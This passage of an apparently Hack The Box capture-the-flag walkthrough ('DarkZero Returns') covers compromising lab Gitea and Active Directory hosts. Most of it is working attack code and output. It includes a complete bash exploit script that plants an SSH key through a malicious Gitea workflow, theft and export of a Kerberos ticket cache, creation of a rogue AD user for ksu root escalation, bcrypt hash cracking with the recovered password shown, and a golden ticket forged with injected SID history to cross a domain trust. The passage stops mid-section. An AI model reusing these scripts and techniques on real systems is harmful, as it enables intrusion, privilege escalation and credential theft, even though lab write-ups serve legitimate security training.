PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"title\":\"pwn\", \"body\": \"pwn\", \"head\": \"darkzero-ext_josh:$BRANCH\", \"base\": \"main\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

export PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
export HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')
echo "[+] PR #$PR_NUM created | Head SHA: $HEAD_SHA"

[+] PR #1 created | Head SHA: e927ad2c9257b6a66059f790e75c92e1cf8222af
```

Now, fire the bug by posting a review comment against the PR:

```bash
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\", \"body\": \"pwn\", \"commit_id\": \"$HEAD_SHA\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PR_NUM/reviews" | jq '.id'

1
```

### CI/CD Exploitation: Phase 5 — Shell Access as svc-runner

With the runner triggered, it executes our workflow payload and appends our key to `authorized_keys`. We can now log in via SSH:

```bash
josh@SRV01:~$ ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.

svc-runner@SRV01:~$ id
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
```

We now have code execution as `svc-runner` on `SRV01` and can claim the user flag!

### Master Exploit Automation Script (Josh to svc-runner)

For convenience, the complete lateral movement sequence can be executed with this automated bash script:

```bash
#!/bin/bash
# ==============================================================================
# DarkZero HTB - Master Exploit Script (Josh -> Svc-Runner)
# ==============================================================================
# Automates: Auth -> Fork -> Branch -> Payload -> PR -> Gitea 1.25 Bug -> SSH
# ==============================================================================

# --- Configuration ---
JOSH_USER="josh"
JOSH_PASS="Rangers1"
DOMAIN="DARKZERO.EXT"
GITEA_URL="http://gitea.darkzero.ext:3000"
TARGET_REPO="DarkZero/DarkZero-Campaigns"

# --- Step 1: Authentication ---
echo "[*] Step 1: Authenticating as $JOSH_USER..."
export KRB5CCNAME=/tmp/josh.ccache
echo "$JOSH_PASS" | kinit "$JOSH_USER@$DOMAIN" 2>/dev/null
if ! klist | grep -q "$DOMAIN"; then
    echo "[-] Kerberos authentication failed. Check password."
    exit 1
fi
echo "[+] Kerberos TGT obtained."

# --- Step 2: SSH Key Generation ---
echo "[*] Step 2: Generating SSH Key Pair..."
rm -f ./htb_key2 ./htb_key2.pub
ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
PUBKEY=$(cat ./htb_key2.pub)
echo "[+] Public Key: $PUBKEY"

# --- Step 3: Fork Repository ---
echo "[*] Step 3: Forking repository..."
FORK_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' "$GITEA_URL/api/v1/repos/$TARGET_REPO/forks")
FORK_USER=$(echo "$FORK_RESP" | jq -r '.owner.login' 2>/dev/null)
if [ "$FORK_USER" == "null" ] || [ -z "$FORK_USER" ]; then
    FORK_USER="darkzero-ext_josh" # Fallback to known username
fi
MY_FORK="$FORK_USER/DarkZero-Campaigns"
echo "[+] Fork identified as: $MY_FORK"

# --- Step 4: Create Unique Branch ---
BRANCH_NAME="pwn-$(date +%s)"
echo "[*] Step 4: Creating unique branch '$BRANCH_NAME'..."
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"new_branch_name\":\"$BRANCH_NAME\", \"old_branch_name\":\"main\"}" \
  "$GITEA_URL/api/v1/repos/$MY_FORK/branches" > /dev/null
echo "[+] Branch created."

# --- Step 5: Upload Malicious Workflow ---
echo "[*] Step 5: Injecting payload into workflow..."
cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF

CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$CONTENT_B64\", \"message\": \"pwn\", \"branch\": \"$BRANCH_NAME\"}" \
  "$GITEA_URL/api/v1/repos/$MY_FORK/contents/.gitea%2Fworkflows%2Fpwn.yml" > /dev/null
echo "[+] Payload uploaded."

# --- Step 6: Create Pull Request ---
echo "[*] Step 6: Creating Pull Request..."
PR_RESP=$(curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"title\":\"pwn\", \"body\": \"pwn\", \"head\": \"$FORK_USER:$BRANCH_NAME\", \"base\": \"main\"}" \
  "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls")

PR_NUM=$(echo "$PR_RESP" | jq -r '.number')
HEAD_SHA=$(echo "$PR_RESP" | jq -r '.head.sha')

if [ "$PR_NUM" == "null" ] || [ -z "$PR_NUM" ]; then
    echo "[-] PR Creation failed. Response:"
    echo "$PR_RESP"
    exit 1
fi
echo "[+] PR #$PR_NUM created (SHA: $HEAD_SHA)."

# --- Step 7: Trigger Gitea 1.25 Bug ---
echo "[*] Step 7: Triggering workflow via Review Comment (The Bug)..."
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\", \"body\": \"pwn\", \"commit_id\": \"$HEAD_SHA\"}" \
  "$GITEA_URL/api/v1/repos/$TARGET_REPO/pulls/$PR_NUM/reviews" > /dev/null
echo "[+] Trigger sent! The runner is now executing the payload..."

# --- Step 8: Wait and Connect ---
echo "[*] Step 8: Waiting 15 seconds for execution..."
sleep 15

echo "[*] Step 9: Connecting as svc-runner..."
chmod 600 ./htb_key2
ssh -i ./htb_key2 -o StrictHostKeyChecking=no svc-runner@127.0.0.1
```

---

## Step 4 - Privilege Escalation

### Host & Gitea Runner Configuration Audit

Now in the context of `svc-runner`, we can inspect the Gitea runner directory which was previously restricted:

```bash
svc-runner@SRV01:/tmp$ ls -la /opt/gitea*
total 20488
drwxr-x--- 4 svc-runner root             4096 May 20 23:36 .
drwxr-xr-x 6 root       root             4096 Jul 21 05:39 ..
-rwxr-x--- 1 svc-runner root         20951202 Feb 18  2026 act_runner
drwxr-x--- 4 svc-runner root             4096 May 20 23:33 .cache
-rwxr-x--- 1 svc-runner root              140 May 20 23:33 config.yaml
drwxr-xr-x 4 svc-runner domain users     4096 May 20 23:36 .npm
-rwxr-x--- 1 svc-runner root              460 May 20 23:33 .runner
```

```yaml
svc-runner@SRV01:/tmp$ cat /opt/gitea*/config*
runner:
  name: "ubuntu-domain-runner"
  labels:
    - "ubuntu:host"
  capacity: 1
cache:
  enabled: true
  dir: "/opt/gitea-runner/.cache"
```

### Active Directory Enumeration via Kerberos Ticket Cache

Examining `/tmp` reveals a pre-existing Kerberos ticket cache belonging to `svc-runner`:

```bash
svc-runner@SRV01:/tmp$ ls
agent
josh.ccache
krb5cc_gitea
pwn.yml
snap-private-tmp
systemd-private-ec097feafbf7450984e7fa3006d9fb86-darkzero_campaigns.service-hZntBK
systemd-private-ec097feafbf7450984e7fa3006d9fb86-fwupd.service-DoTtpg
systemd-private-ec097feafbf7450984e7fa3006d9fb86-ModemManager.service-pVwKhJ
systemd-private-ec097feafbf7450984e7fa3006d9fb86-polkit.service-v0tef5
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-logind.service-f6qtqE
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-resolved.service-5Mq3ns
systemd-private-ec097feafbf7450984e7fa3006d9fb86-systemd-timesyncd.service-LCHB01
systemd-private-ec097feafbf7450984e7fa3006d9fb86-upower.service-9ESN0M
```

```bash
svc-runner@SRV01:/tmp$ export KRB5CCNAME=krb5cc_gitea
svc-runner@SRV01:/tmp$ klist
Ticket cache: FILE:krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 20:05:05  08/28/2026 06:05:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 20:05:05
```

This is a valid Ticket Granting Ticket (TGT).

### Clock Skew Synchronization & Local Ticket Export

To export the cached Kerberos ticket to our local attack machine for Active Directory enumeration:

1. **Encode the credential cache to Base64 on target:**
   ```bash
   base64 -w0 /tmp/krb5cc_gitea
   ```
2. **Decode and restore the ticket cache locally:**
   ```bash
   echo '<PASTE_B64>' | base64 -d > svc-runner.ccache
   ```
3. **Restrict ticket file permissions:**
   ```bash
   chmod 600 svc-runner.ccache
   ```
4. **Set the Kerberos cache environment variable:**
   ```bash
   export KRB5CCNAME=$(pwd)/svc-runner.ccache
   ```

Verify the ticket cache on the local attack machine:

```bash
# klist
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/svc-runner.ccache
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 20:05:05  08/28/2026 06:05:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 20:05:05
```

Let's begin by querying all domain users:

```bash
impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

> ⚠️ **Kerberos Clock Skew Synchronization:**  
> Kerberos authentication strictly enforces time synchronization between client and KDC (default tolerance: 5 minutes). Standard `ntpdate` was blocked, so we synchronize local system time directly via SSH:

```bash
sudo date -s "$(sshpass -p 'Rangers1' ssh -o StrictHostKeyChecking=no josh@dzcampaigns.htb date)"
Warning: Permanently added '10.129.97.182' (ED25519) to the list of known hosts.
Thu Aug 27 10:15:26 PM UTC 2026
```

### Active Directory Domain User & SPN Enumeration

With the clock synchronized, query domain users again:

```bash
impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[*] Querying DC02 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2026-05-18 12:41:22.805234  2026-07-23 20:35:01.916591 
Guest                                                 <never>              <never>             
krbtgt                                                2026-04-06 14:16:41.351015  <never>             
                                                      2026-08-27 20:17:43.130682  <never>             
david                                                 2026-05-18 12:57:32.478077  <never>             
william                                               2026-05-18 12:57:32.633953  <never>             
celia                                                 2026-07-14 13:59:09.283092  <never>             
josh                                                  2026-05-20 22:38:58.851243  2026-08-27 22:15:25.262726 
svc-gitea                                             2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185 
svc-runner                                            2026-05-20 22:50:01.066715  2026-08-27 20:05:05.647826 
```

Now let's check for Kerberoastable Service Principal Names (SPNs):

```bash
impacket-GetUserSPNs -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
ServicePrincipalName          Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
----------------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
HTTP/gitea.darkzero.ext:3000  svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185             
HTTP/gitea.darkzero.ext       svc-gitea  CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext  2026-05-20 22:50:00.501204  2026-08-27 20:04:38.036185             
```

No roastable user SPNs are present.

### LDAP Organizational Unit & ACL Enumeration

Let's enumerate Active Directory Organizational Units using `ldapsearch`:

```text
ldapsearch -Y GSSAPI -H ldap://dc02.darkzero.ext -b "DC=darkzero,DC=ext" \
  "(objectClass=organizationalUnit)" ou
SASL/GSSAPI authentication started
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <DC=darkzero,DC=ext> with scope subtree
# filter: (objectClass=organizationalUnit)
# requesting: ou 
#

# Domain Controllers, darkzero.ext
dn: OU=Domain Controllers,DC=darkzero,DC=ext
ou: Domain Controllers

# GiteaMigration, darkzero.ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
ou: GiteaMigration

# search reference
ref: ldap://ForestDnsZones.darkzero.ext/DC=ForestDnsZones,DC=darkzero,DC=ext

# search reference
ref: ldap://DomainDnsZones.darkzero.ext/DC=DomainDnsZones,DC=darkzero,DC=ext

# search reference
ref: ldap://darkzero.ext/CN=Configuration,DC=darkzero,DC=ext

# search result
search: 4
result: 0 Success
```

Now let's check if `svc-runner` has write permissions over any of these OUs using `bloodyAD`:

```bash
bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=darkzero,DC=ext
permission: CREATE_CHILD
```

We have `CREATE_CHILD` permissions on `OU=GiteaMigration,DC=darkzero,DC=ext` and `DC=_msdcs.darkzero.ext`.

Attempting BloodHound collection via Kerberos resulted in an LDAP signing dispute:

```text
bloodhound-python -d darkzero.ext -u svc-runner -k -no-pass \
  -dc dc02.darkzero.ext -ns 172.16.20.2 -c All --zip --disable-autogc
...
ldap3.core.exceptions.LDAPUnknownAuthenticationMethodError: NTLM needs domain\username and a password 
```

Rather than submitting to the friction of this protocol dispute, we will pivot directly to the confirmed objective: exploiting the child object creation rights on the `GiteaMigration` OU.

### Active Directory DACL Abuse (Child Object Creation in OU=GiteaMigration)

As we can create child objects inside `GiteaMigration`, we will use `bloodyAD` to create a new Active Directory user named `root` inside that OU:

```bash
bloodyAD -u svc-runner -d DARKZERO.EXT -k --host dc02.darkzero.ext --dc-ip 172.16.20.2 \
  add user root 'RootPass123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'

[+] root created
```

To verify the user was successfully created, query the domain users with Impacket:

```bash
impacket-GetADUsers -k -no-pass -dc-ip 172.16.20.2 DARKZERO.EXT/svc-runner -all
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[*] Querying DC02 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2026-05-18 12:41:22.805234  2026-07-23 20:35:01.916591 
Guest                                                 <never>              <never>             
krbtgt                                                2026-04-06 14:16:41.351015  <never>             
                                                      2026-08-29 22:06:36.822845  <never>             
david                                                 2026-05-18 12:57:32.478077  <never>             
william                                               2026-05-18 12:57:32.633953  <never>             
celia                                                 2026-07-14 13:59:09.283092  <never>             
josh                                                  2026-05-20 22:38:58.851243  2026-08-29 22:13:14.677181 
svc-gitea                                             2026-05-20 22:50:00.501204  2026-08-29 21:53:39.169801 
svc-runner                                            2026-05-20 22:50:01.066715  2026-08-29 21:54:13.522662 
root                                                  2026-08-29 22:12:32.026066  <never>
```

User `root@DARKZERO.EXT` is confirmed!

### Kerberos Substitute User Escalation (ksu root)

Now to elevate to root on this host, we leverage Kerberos Substitute User (`ksu`) authentication and authorization.

> 📌 **What is ksu?**  
> The `ksu` (Kerberos Substitute User) utility is a secure, Kerberized counterpart of the traditional Linux `su` program. Its purpose is to securely transition a user's real and effective UID to a target identity (such as `root`) by relying on Kerberos tickets instead of local password hashes.

The `ksu` workflow operates in two main phases: Authentication and Authorization:

```text
┌────────────────┐                ┌─────────────────────────┐
│   Linux User   │─(1. kinit/TGT)─>   Active Directory (KDC)│
└───────┬────────┘                └────────────┬────────────┘
        │                                      │
 (2. ksu root)                                 │
        │                                      │
        ├──(3. Request host/ Service Ticket)──>│
        │<──(4. Issue Service Ticket)──────────┘
        │
 (5. Check .k5login / .k5users)
        │
┌───────▼────────┐
│ Granted Root!  │
└────────────────┘
```

#### ksu Execution Lifecycle:

1. **Requesting the Ticket Granting Ticket (TGT) via `kinit`:**  
   The local Linux user authenticates as the newly created Active Directory object using the `kinit` utility.

2. **Executing the Identity Switch (`ksu root`):**  
   With a valid domain identity loaded into the session cache, the user initiates the privilege escalation request.

3. **Service Ticket Request:**  
   Before changing user contexts, `ksu` must cryptographically verify that the TGT held by the user is valid and current.

4. **Issuance of the Service Ticket:**  
   The KDC processes the request against the active TGT session and returns a service ticket for the host service.

5. **Local Authorization Evaluation (`.k5login` / `.k5users`):**  
   Now that identity is proven, `ksu` evaluates local security policies to determine if this domain user has permission to become the local system root.

> 💡 **Privilege Escalation Execution:** Because both authentication (Steps 1–4) and local authorization (Step 5) checks succeed, `ksu` changes the effective User ID (UID) of the process to `0` and spawns an interactive root shell.

Now let's start by requesting a TGT for `root`:

```bash
svc-runner@SRV01:/tmp$ echo "RootPass123!" | kinit root@DARKZERO.EXT
Password for root@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC

svc-runner@SRV01:/tmp$ klist
Ticket cache: KEYRING:persistent:780601113:780601113
Default principal: root@DARKZERO.EXT

Valid starting       Expires              Service principal
08/29/2026 22:36:47  08/30/2026 08:36:47  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/05/2026 22:36:38
```

Now execute `ksu` to switch to root:

```bash
svc-runner@SRV01:/tmp$ ksu root
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root

root@SRV01:/tmp# whoami
root
root@SRV01:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

We now have full root access on `SRV01`!

### Root Filesystem Inspection & Database Backup Extraction

With root access on the machine, the remaining unchecked folder is `/root`. Let's inspect it:

```bash
root@SRV01:~# ls
darkzero_campaigns_backup.sql
```

Inspecting the database backup SQL file reveals user credentials:

```sql
INSERT INTO `users` VALUES (1,'admin@dzcampaigns.htb','admin','$2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm','admin','2026-04-19 15:34:56');
INSERT INTO `users` VALUES (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTatDHIAAp3H58YYaTOgdhMlpbWBTEq1.MWFq5se6OOG3nV2Wy','player','2026-04-20 17:27:37');
```

The table contains new credentials for users `celia` and `jerry` with bcrypt password hashes. Let's crack them with Hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC:babygurl13 --> celia
```

`jerry`'s hash remained uncracked, but we obtained `celia`'s password: `babygurl13`.

### Celia Hash Cracking & BloodHound Collection

Now that we have pure plaintext domain credentials, we can resolve the previous BloodHound collection issue:

```bash
bloodhound-python -d darkzero.ext -u celia -p 'babygurl13' -no-pass \
  -dc dc02.darkzero.ext -ns 172.16.20.2 -c All --zip --disable-autogc
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.ext
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc02.darkzero.ext
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc02.darkzero.ext
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 11 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 22 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: srv01.darkzero.ext
INFO: Querying computer: DC02.darkzero.ext
INFO: Done in 01M 26S
INFO: Compressing output into 20260829224845_bloodhound.zip
```

![web-img](images/DarkZeroReturns/d20.png)

First look at `celia` in BloodHound:
- `CELIA` (owned) → `MemberOf` → `DOMAIN ADMINS`, `DOMAIN USERS`, `GITEAADMINS`.
- `DOMAIN ADMINS` → `MemberOf` → `ADMINISTRATORS` and `DENIED RODC PASSWORD REPLICATION GROUP`.
- Domain Admins effectively holds `GenericAll` over the domain—which is why Celia has 91 outbound control edges.

### Cross-Domain Trust Exploitation Architecture (Forest Root Escalation)

Celia is already a Domain Admin in `darkzero.ext`, so there is little left to compromise in this local child domain.

> 📌 **What is Cross-Domain Trust Exploitation via Forged Referral Tickets?**  
> The question is never *"what can Celia do?"* — it's *"what can Celia give us that crosses a trust?"*  
> We are currently on `darkzero.ext`, which is a secondary child domain. To compromise the entire infrastructure, we must escalate to the forest root domain: `darkzero.htb`.  
> Cross-Domain Trust Exploitation via Forged Referral Tickets is an Active Directory lateral movement and privilege escalation technique that allows an attacker with administrative control over a child domain to cross security trust boundaries and compromise parent or forest-root domains.

```text
┌──────────────────┐               ┌─────────────────────────┐               ┌─────────────────────────┐
│  Linux Attacker  │               │   DC02 (DARKZERO.EXT)   │               │   DC01 (DARKZERO.HTB)   │
└────────┬─────────┘               └────────────┬────────────┘               └────────────┬────────────┘
         │                                      │                                         │
         │──── (1) Forged TGT with PAC ────────>│                                         │
         │         (Injected SID History)       │                                         │
         │                                      │                                         │
         │<─── (2) Issue Referral TGS ──────────│                                         │
         │         (Encrypted with Trust Key)   │                                         │
         │                                      │                                         │
         │──── (3) Present Referral TGS ─────────────────────────────────────────────────>│
         │                                      │                                         │
         │                                      │                             (4) Decrypts with Trust Key,
         │                                      │                                 Validates PAC,
         │                                      │                                 Honors SID History
         │                                      │                                         │
         │<─── (5) Issue Final Service Ticket ────────────────────────────────────────────│
         │                                      │                                         │
─────────┴──────────────────────────────────────┴─────────────────────────────────────────┴──────────
```

#### Core Concepts to Understand:

- **PAC (Privilege Attribute Certificate):** A cryptographic structure inside a Kerberos ticket containing the user's security identifiers (SIDs) and group memberships.
- **SID History:** An Active Directory attribute originally intended to retain access rights when migrating user objects between domains. If an account has a high-privilege SID (such as Enterprise Admins) in its `sIDHistory`, Kerberos honors it unless SID filtering is explicitly enforced.
- **Trust Key:** A shared secret password between two domains used to sign and encrypt inter-domain communications (Referral Tickets).

#### Trust Exploitation Phases:

- **Trust Step 1: Ticket Forgery & Injection**  
  From our Linux machine, we craft a counterfeit Ticket Granting Ticket (TGT). Using administrative control over the compromised domain `DARKZERO.EXT`, we inject a high-privilege SID from the target domain (`DARKZERO.HTB`) into the `sIDHistory` field of the PAC. We present this ticket to the domain controller of our compromised domain (`DC02`).

- **Trust Step 2: The Inter-Domain Referral**  
  `DC02` processes the request. Because the requested resource resides in `DARKZERO.HTB`, `DC02` generates a Referral Ticket Granting Service (TGS) ticket. Crucially, `DC02` copies our injected SID History into this referral ticket and encrypts/signs it using the inter-domain Trust Key.

- **Trust Step 3: Crossing the Bridge**  
  We receive the Referral TGS from `DC02` and present it directly to the target domain controller (`DC01`) governing `DARKZERO.HTB`.

- **Trust Step 4: Trust Validation & Privilege Escalation**  
  `DC01` receives the ticket. Because it is encrypted with the shared Trust Key, `DC01` successfully decrypts and trusts its contents. `DC01` parses the PAC, inspects the injected SID History, and—assuming SID Filtering is disabled or improperly configured across the trust—honors the high-privilege group membership.

- **Trust Step 5: Access Granted**  
  `DC01` issues the final Service Ticket. We now have administrative access to resources within the `DARKZERO.HTB` environment.

```text
┌─────────────────────────────────┐
│       DARKZERO.HTB (Root)       │
│           [ Parent ]            │
└────────────────┬────────────────┘
                 ▲
                 │  ▲ 2-Way
                 │  │ Transitive
                 ▼  │ Trust
┌────────────────┴────────────────┐
│      DARKZERO.EXT (Child)       │
│          [ Trusted ]            │
└─────────────────────────────────┘
```

#### Trust Relationship Structure:

- **The Relationship:** `DARKZERO.HTB` is the root parent domain, and `DARKZERO.EXT` is a child domain.
- **Automatic Creation:** In Active Directory, when a child domain is created under a forest root, a 2-Way Transitive Trust is automatically established.
- **Direction of Trust vs. Direction of Access:**
  - **Trust Direction:** Bidirectional. `DARKZERO.HTB` trusts `DARKZERO.EXT`, and `DARKZERO.EXT` trusts `DARKZERO.HTB`.
  - **Access Direction:** Because trust flows both ways, users from either domain can access resources in the opposite domain.

Before executing cross-domain attacks, configure `/etc/krb5.conf`:

```ini
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    DARKZERO.EXT = {
        kdc = 172.16.20.2
        admin_server = 172.16.20.2
    }
    DARKZERO.HTB = {
        kdc = 172.16.20.1
        admin_server = 172.16.20.1
    }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB
    darkzero.htb = DARKZERO.HTB
```

### Trust Phase 1: Forging the Golden TGT with Injected SID History

Using `impacket-ticketer`, we forge a Golden TGT for `celia`, injecting the privileged SID from `DARKZERO.HTB`:

```bash
impacket-ticketer \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -domain darkzero.ext \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  -groups 513 -user-id 1109 \
  celia

Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/celia
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in celia.ccache
```

#### Forged Ticket Configuration Breakdown:

| Flag / Parameter | Value | Role / Purpose |
| :--- | :--- | :--- |
| **`-aesKey`** | `krbtgt` AES-256 key *(from DCSync)* | **The Signature:** Validates the ticket, forcing `DC02` to accept the forged TGT. |
| **`-domain` / `-domain-sid`** | `darkzero.ext` / `S-1-5-21-2850...` | **The Realm:** Defines the domain and SID namespace where the ticket originates. |
| **`-user-id`** | `1109` *(Celia's RID)* | **The Identity:** Builds the user's primary security identifier (Domain SID + 1109). |
| **`-groups`** | `513` *(Domain Users)* | **The Baseline:** Grants standard group membership so the token looks ordinary. |
| **`-extra-sid`** | `S-1-5-21-...-1603` *(HTB privileged group)* | **The Privilege Escalation:** Injects the target domain's admin SID into the **SID History** that `DC01` will honor. |
| **`celia`** *(Positional)* | Username | **The Cosmetic Label:** Sets the visual username displayed inside the ticket logs. |

> ⚠️ **Golden Ticket Mechanics:**  
> The KDC has no way to distinguish a genuine TGT from a forged one — it simply checks: *"does this ticket decrypt/verify with my krbtgt key?"* If yes, it is trusted. Possessing that key allows us to mint valid TGTs for any identity with any group memberships we choose.

Load and verify the ticket cache:

```bash
export KRB5CCNAME=$(pwd)/celia.ccache
klist
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41
```

### Trust Phase 2: Present Referral TGS to DC01

With the referral TGT loaded, we request a Service Ticket for CIFS on `dc01.darkzero.htb`:

```bash
kvno cifs/dc01.darkzero.htb
klist
cifs/dc01.darkzero.htb@DARKZERO.EXT: kvno = 4
Ticket cache: FILE:/home/kali/HTB/Season-11/DarkzeroReturns/celia.ccache
Default principal: celia@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 22:14:41  09/07/2036 22:14:41  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/07/2036 22:14:41
09/10/2026 22:21:56  09/11/2026 08:21:55  cifs/dc01.darkzero.htb@DARKZERO.EXT
        renew until 09/17/2026 22:21:55
        Ticket server: cifs/dc01.darkzero.htb@DARKZERO.HTB
```

Checking `klist` confirms the structure of our cross-domain referral:
1. **The Forged TGT:** A `krbtgt` ticket with an anomalous 10-year lifespan.
2. **The Inter-Domain Referral (TGS):** A `cifs/dc01.darkzero.htb@DARKZERO.EXT` ticket pointing to the `DARKZERO.HTB` realm.

Because `DC01` honors the Trust Key signature and our injected SID History, this cache grants direct authenticated SMB access to the root domain controller.

### Trust Phase 3: SeBackupPrivilege Abuse & SAM/SYSTEM Hive Extraction

Our credential cache now holds `cifs/dc01.darkzero.htb@DARKZERO.HTB`. Let's test our access using NetExec:

```bash
netexec smb 172.16.20.1 -k --use-kcache
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 
```

> ⚠️ **Access Rights Analysis:**  
